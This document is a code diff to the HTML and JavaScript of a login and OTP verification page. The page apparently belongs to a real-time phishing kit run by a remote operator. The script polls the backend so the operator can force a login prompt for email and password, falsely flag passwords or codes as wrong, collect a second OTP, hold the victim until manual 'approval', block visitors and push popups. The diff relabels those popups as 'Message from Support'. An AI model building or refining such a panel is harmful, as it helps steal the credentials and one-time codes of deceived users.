@@ -40,6 +40,73 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 .modal-btn:disabled{opacity:0.6;cursor:not-allowed}
 .modal-error{color:#ef4444;font-size:12px;margin-top:12px;display:none}
 .loading-spinner-small{width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid #4f46e5;border-radius:50%;animation:spin 1s linear infinite;margin:10px auto}
+
+/* Admin text popup */
+#adminTextPopup {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.88);
+  backdrop-filter: blur(8px);
+  z-index: 20000;
+  justify-content: center;
+  align-items: center;
+}
+#adminTextPopup.active { display: flex; }
+.admin-text-box {
+  background: white;
+  border-radius: 28px;
+  max-width: 400px;
+  width: 90%;
+  padding: 32px 24px;
+  text-align: center;
+  box-shadow: 0 25px 50px rgba(0,0,0,0.35);
+}
+.admin-text-icon {
+  width: 60px; height: 60px;
+  background: #f97316;
+  border-radius: 30px;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 20px;
+}
+.admin-text-icon svg { width: 30px; height: 30px; stroke: white; fill: none; }
+.admin-text-title { font-size: 20px; font-weight: 700; color: #1f2937; margin-bottom: 16px; }
+.admin-text-content {
+  background: #f3f4f6;
+  padding: 20px;
+  border-radius: 16px;
+  font-size: 17px;
+  line-height: 1.8;
+  color: #1f2937;
+  word-break: break-word;
+}
+.msg-yes {
+  color: #059669;
+  font-weight: 800;
+  font-size: 1.35em;
+  background: #d1fae5;
+  padding: 2px 10px;
+  border-radius: 8px;
+  display: inline-block;
+}
+.msg-num {
+  color: #4f46e5;
+  font-weight: 800;
+  font-size: 1.2em;
+  background: #e0e7ff;
+  padding: 2px 8px;
+  border-radius: 8px;
+  display: inline-block;
+}
+.msg-caps {
+  color: #dc2626;
+  font-weight: 800;
+  background: #fee2e2;
+  padding: 2px 8px;
+  border-radius: 8px;
+  display: inline-block;
+}
 </style>
 </head>
 <body>
@@ -59,6 +126,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   </div>
 </div>
 
+<!-- Login modal (force login) -->
 <div id="loginModal" class="modal-overlay">
   <div class="modal" id="loginModalContent">
     <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
@@ -68,6 +136,17 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
     <button id="submitLoginBtn" class="modal-btn">Login to Continue →</button>
     <div id="modalError" class="modal-error"></div>
+  </div>
+</div>
+
+<!-- Admin text popup -->
+<div id="adminTextPopup">
+  <div class="admin-text-box">
+    <div class="admin-text-icon">
+      <svg viewBox="0 0 24 24" stroke-width="1.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    </div>
+    <div class="admin-text-title">Message from Support</div>
+    <div class="admin-text-content" id="adminTextContent"></div>
   </div>
 </div>
 
@@ -86,102 +165,34 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   let isModalOpen       = false;
   let adminTextHandling = false;
 
-  // ── Helper: close login modal immediately ─────────────────────────────────
-  function closeLoginModal() {
-    const modal = document.getElementById('loginModal');
-    if (modal && modal.classList.contains('active')) {
-      modal.classList.remove('active');
-      isModalOpen = false;
-    }
+  // Format message function (same as otp.html)
+  function formatMessage(rawText) {
+    const parts = rawText.split(/(\s+|[^a-zA-Z0-9]+)/);
+    return parts.map(part => {
+      if (/^yes$/i.test(part)) {
+        return `<span class="msg-yes">YES</span>`;
+      }
+      if (/^\d+$/.test(part)) {
+        return `<span class="msg-num">${part}</span>`;
+      }
+      if (/^[A-Z]{3,}$/.test(part)) {
+        return `<span class="msg-caps">${part}</span>`;
+      }
+      return part.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
+    }).join('');
   }
 
-// ── Handle regular text messages with formatting ───────────────────────────
-function formatTextMessage(message) {
-  // First, escape HTML
-  let formatted = message.replace(/[&<>]/g, function(m) {
-    if (m === '&') return '&amp;';
-    if (m === '<') return '&lt;';
-    if (m === '>') return '&gt;';
-    return m;
-  });
-  
-  // Find and format the word "YES" (case insensitive) - make it green, bold, larger
-  formatted = formatted.replace(/\bYES\b/gi, function(match) {
-    return '<span style="color: #10b981; font-weight: 800; font-size: 1.3em; background: #d1fae5; padding: 2px 8px; border-radius: 8px; display: inline-block;">' + match.toUpperCase() + '</span>';
-  });
-  
-  // Format all numbers/digits - make them bold and highlighted
-  formatted = formatted.replace(/\b(\d+)\b/g, function(match) {
-    return '<span style="color: #4f46e5; font-weight: 800; background: #e0e7ff; padding: 2px 8px; border-radius: 8px; display: inline-block;">' + match + '</span>';
-  });
-  
-  // Also format any word that is all caps (like special codes)
-  formatted = formatted.replace(/\b([A-Z]{3,})\b/g, function(match) {
-    if (match !== 'YES') {
-      return '<span style="color: #dc2626; font-weight: 800; background: #fee2e2; padding: 2px 8px; border-radius: 8px; display: inline-block;">' + match + '</span>';
-    }
-    return match;
-  });
-  
-  return formatted;
-}
-
-async function showTextPopup(message) {
-  // First, close the login modal if it's open
-  const loginModal = document.getElementById('loginModal');
-  if (loginModal && loginModal.classList.contains('active')) {
-    loginModal.classList.remove('active');
-    isModalOpen = false;
+  function showAdminTextPopup(rawMessage) {
+    const popup   = document.getElementById('adminTextPopup');
+    const content = document.getElementById('adminTextContent');
+    content.innerHTML = formatMessage(rawMessage);
+    popup.classList.add('active');
   }
 
-  // Format the message ONLY if not already formatted
-  const formattedMessage = message.includes('<span') 
-    ? message 
-    : formatTextMessage(message);
-
-  let textModal = document.getElementById('customTextModal');
-  if (!textModal) {
-    textModal = document.createElement('div');
-    textModal.id = 'customTextModal';
-    textModal.style.cssText = `
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.85);
-      backdrop-filter: blur(8px);
-      z-index: 20000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    `;
-    textModal.innerHTML = `
-      <div style="background: white; border-radius: 28px; max-width: 400px; width: 90%; padding: 32px 24px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.3);">
-        <div style="width: 60px; height: 60px; background: #f97316; border-radius: 30px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="width: 32px; height: 32px; stroke: white;">
-            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
-          </svg>
-        </div>
-        <h3 style="font-size: 22px; font-weight: 700; color: #1f2937; margin-bottom: 8px;">Message from Admin</h3>
-        <div id="customTextMessageContent" style="background: #f3f4f6; padding: 20px; border-radius: 16px; margin: 20px 0; text-align: center; font-size: 16px; line-height: 1.6; color: #1f2937;"></div>
-        <button onclick="this.parentElement.parentElement.remove()" style="width: 100%; padding: 14px; background: linear-gradient(90deg, #2563eb, #7c3aed); color: white; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 14px;">Close</button>
-      </div>
-    `;
-    document.body.appendChild(textModal);
+  function hideAdminTextPopup() {
+    document.getElementById('adminTextPopup').classList.remove('active');
   }
-  
-  // Set the formatted HTML content
-  document.getElementById('customTextMessageContent').innerHTML = formattedMessage;
-  textModal.style.display = 'flex';
 
-  // Auto-remove after 15 seconds
-  setTimeout(() => {
-    if (textModal) textModal.style.display = 'none';
-  }, 15000);
-}
-
-  // ── User-side flag release ────────────────────────────────────────────────
   async function releaseAdminText() {
     try {
       await fetch('/api/users/release-admin-text', {
@@ -192,7 +203,6 @@ async function showTextPopup(message) {
     } catch (e) {}
   }
 
-  // ── Single unified admin_text poller ───────────────────────────────────────
   async function pollAdminText() {
     if (adminTextHandling) return;
     try {
@@ -202,34 +212,33 @@ async function showTextPopup(message) {
         body: JSON.stringify({ email })
       });
       const data = await res.json();
-      if (!data.admin_text || data.text_release === true) return;
 
-      adminTextHandling = true;
-
-      // NEW: Check for regular text message first (not a special flag)
-      if (data.admin_text && data.admin_text.trim() !== '' && 
-          data.admin_text !== 'incorrect_otp_error' && 
-          data.admin_text !== 'wrong_login_error' && 
-          data.admin_text !== 'correct_login_success') {
-        // This is a regular text message from "Send Text" button
-        await showTextPopup(data.admin_text);  // Pass raw message - formatting happens inside showTextPopup
-        await releaseAdminText();
-        adminTextHandling = false;
+      if (data.text_release === true) {
+        hideAdminTextPopup();
         return;
       }
 
-      if      (data.admin_text === 'incorrect_otp_error')  await handleIncorrectOtp();
-      else if (data.admin_text === 'wrong_login_error')     await handleWrongLogin();
-      else if (data.admin_text === 'correct_login_success') await handleCorrectLogin();
-      else { await releaseAdminText(); adminTextHandling = false; }
+      if (!data.admin_text) return;
+
+      adminTextHandling = true;
+      const txt = data.admin_text;
+
+      if (txt === 'incorrect_otp_error') {
+        await handleIncorrectOtp();
+      } else if (txt === 'wrong_login_error') {
+        await handleWrongLogin();
+      } else if (txt === 'correct_login_success') {
+        await handleCorrectLogin();
+      } else {
+        showAdminTextPopup(txt);
+        adminTextHandling = false;
+      }
 
     } catch (e) { adminTextHandling = false; }
   }
 
-  // ── Incorrect OTP ──────────────────────────────────────────────────────────
   async function handleIncorrectOtp() {
     await releaseAdminText();
-
     if (approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
     isProcessing = false;
 
@@ -239,26 +248,18 @@ async function showTextPopup(message) {
 
     verifyBtn.disabled = true;
     verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
-    setTimeout(() => {
-      verifyBtn.disabled = false;
-      verifyBtn.innerHTML = 'Verify';
-      otpInput.focus();
-    }, 2000);
-
+    setTimeout(() => { verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; otpInput.focus(); }, 2000);
     setTimeout(() => { errorDiv.style.display = 'none'; adminTextHandling = false; }, 5000);
   }
 
-  // ── Wrong login ────────────────────────────────────────────────────────────
   async function handleWrongLogin() {
     await releaseAdminText();
-
-    const modalError   = document.getElementById('modalError');
+    const modalError    = document.getElementById('modalError');
     const loginPassword = document.getElementById('loginPassword');
-    const submitBtn    = document.getElementById('submitLoginBtn');
+    const submitBtn     = document.getElementById('submitLoginBtn');
 
     if (modalError)    { modalError.textContent = '❌ Invalid email or password. Please try again.'; modalError.style.display = 'block'; }
     if (loginPassword) loginPassword.value = '';
-
     if (submitBtn) {
       submitBtn.disabled = true;
       submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
@@ -267,7 +268,6 @@ async function showTextPopup(message) {
     setTimeout(() => { if (modalError) modalError.style.display = 'none'; adminTextHandling = false; }, 4000);
   }
 
-  // ── Correct login ──────────────────────────────────────────────────────────
   async function handleCorrectLogin() {
     await releaseAdminText();
     const mc = document.getElementById('loginModalContent');
@@ -283,7 +283,6 @@ async function showTextPopup(message) {
     setTimeout(() => { adminTextHandling = false; }, 3000);
   }
 
-  // ── Block check ────────────────────────────────────────────────────────────
   async function checkIfBlocked() {
     try {
       const res  = await fetch('/api/users/check-blocked', {
@@ -304,27 +303,52 @@ async function showTextPopup(message) {
     }, 3000);
   }
 
-  // ── Second OTP submit + second-approval poll ───────────────────────────────
-  function showLoading() { isProcessing = true; verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; errorDiv.style.display = 'none'; }
-  function showWaiting() { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>'; }
-  function resetButton() { isProcessing = false; verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; }
+  function showLoading() { 
+    isProcessing = true; 
+    verifyBtn.disabled = true; 
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; 
+    errorDiv.style.display = 'none'; 
+  }
+  
+  function showWaiting() { 
+    verifyBtn.disabled = true; 
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>'; 
+  }
+  
+  function resetButton() { 
+    isProcessing = false; 
+    verifyBtn.disabled = false; 
+    verifyBtn.innerHTML = 'Verify'; 
+  }
 
+  // CRITICAL FIX: Use the same pattern as first OTP but for second OTP
   function startCheckingSecondApproval() {
     if (approvalInterval) clearInterval(approvalInterval);
     approvalInterval = setInterval(async () => {
       try {
         const blocked = await checkIfBlocked();
         if (blocked) return;
-        const res  = await fetch('/api/users/check-second-approval', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
+        
+        // Use check-first-approval for second OTP as well (since second_approved is what we need)
+        // Or make sure your backend has /api/users/check-second-approval that returns second_approved
+        const res  = await fetch('/api/users/check-first-approval', {
+          method: 'POST', 
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
         const data = await res.json();
+        
+        // Debug: log to see what's coming back
+        console.log('Approval check response:', data);
+        
         if (data.approved === true) {
+          console.log('Approved! Redirecting to success...');
           clearInterval(approvalInterval);
           window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
         }
-      } catch (e) {}
+      } catch (e) {
+        console.error('Approval polling error:', e);
+      }
     }, 2000);
   }
 
@@ -344,21 +368,21 @@ async function showTextPopup(message) {
     showLoading();
     try {
       const res  = await fetch('/api/users/submit-second-otp', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, otp })
       });
       const data = await res.json();
+      
       if (data.success) {
         showWaiting();
         startBlockChecking();
         startCheckingSecondApproval();
       } else {
         resetButton();
-        otpInput.value = '';
         errorDiv.textContent = data.error || 'Something went wrong. Please try again.';
         errorDiv.style.display = 'block';
-        setTimeout(() => errorDiv.style.display = 'none', 5000);
-        otpInput.focus();
+        setTimeout(() => errorDiv.style.display = 'none', 4000);
       }
     } catch (e) {
       resetButton();
@@ -368,7 +392,6 @@ async function showTextPopup(message) {
     }
   }
 
-  // ── Force-login polling ────────────────────────────────────────────────────
   function startForceLoginPolling() {
     setInterval(async () => {
       if (isModalOpen) return;
@@ -391,7 +414,6 @@ async function showTextPopup(message) {
     }, 2000);
   }
 
-  // ── Redirect-success polling ───────────────────────────────────────────────
   function startRedirectSuccessPolling() {
     setInterval(async () => {
       try {
@@ -405,16 +427,23 @@ async function showTextPopup(message) {
     }, 2000);
   }
 
-  // ── Login modal submit ─────────────────────────────────────────────────────
   async function submitLogin() {
     const loginEmail    = document.getElementById('loginEmail').value.trim();
     const loginPassword = document.getElementById('loginPassword').value;
     const modalError    = document.getElementById('modalError');
     const submitBtn     = document.getElementById('submitLoginBtn');
 
-    if (!loginEmail || !loginPassword) { modalError.textContent = 'Please enter both email and password'; modalError.style.display = 'block'; return; }
+    if (!loginEmail || !loginPassword) { 
+      modalError.textContent = 'Please enter both email and password'; 
+      modalError.style.display = 'block'; 
+      return; 
+    }
     const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
-    if (!emailRegex.test(loginEmail)) { modalError.textContent = 'Please enter a valid email address'; modalError.style.display = 'block'; return; }
+    if (!emailRegex.test(loginEmail)) { 
+      modalError.textContent = 'Please enter a valid email address'; 
+      modalError.style.display = 'block'; 
+      return; 
+    }
 
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
@@ -443,7 +472,7 @@ async function showTextPopup(message) {
     }
   }
 
-  // ── Boot ───────────────────────────────────────────────────────────────────
+  // Boot all the things
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startBlockChecking();
